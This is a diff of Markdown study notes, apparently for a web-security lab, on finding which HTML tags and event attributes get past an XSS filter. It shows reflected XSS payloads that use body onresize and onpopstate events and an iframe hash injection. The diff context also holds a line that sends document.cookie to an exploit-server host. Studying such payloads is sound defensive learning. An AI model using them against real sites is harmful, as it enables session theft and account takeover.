@@ -69,14 +69,14 @@ document.location='https://exploit.exploit-server.net/cookies?c='+document.cooki
 ### Methodology to identify allowed XSS Tags  
 
 >Identified Reflected XSS in **search** function then determine the HTML tags and events attributes not blocked  
-
-<sup>Body and event **'onresize'** is only allowed</sup>  
+  
+>Body and event **'onresize'** is only allowed.  
 
 ```JavaScript
 ?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
 ```  
 
-<sup>Body and event **'onpopstate'** is only allowed</sup>  
+>Body and event **'onpopstate'** is only allowed.  
   
 ```JavaScript
 ?search=%22%3E%3Cbody%20onpopstate=print()>
@@ -84,7 +84,7 @@ document.location='https://exploit.exploit-server.net/cookies?c='+document.cooki
 
 [Example: onpopstate event (XSS)](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpopstate)  
 
-<sup>OnHashChange XSS</sup>  
+>OnHashChange **#** XSS  
   
 ```JavaScript
 <iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
